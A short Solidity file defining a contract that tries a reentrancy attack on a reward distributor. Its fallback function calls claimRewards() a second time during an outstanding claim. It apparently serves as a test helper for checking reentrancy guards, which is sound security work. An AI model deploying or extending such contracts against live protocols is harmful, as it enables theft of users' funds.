// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IDistributor {
    function claimRewards() external;
}

contract ReentrancyAttack {
    IDistributor public distributor;
    bool public attacked;

    constructor(address _dist) {
        distributor = IDistributor(_dist);
    }

    fallback() external {
        if (!attacked) {
            attacked = true;
            distributor.claimRewards(); // reentrancy attempt
        }
    }

    function attack() external {
        distributor.claimRewards();
    }
}
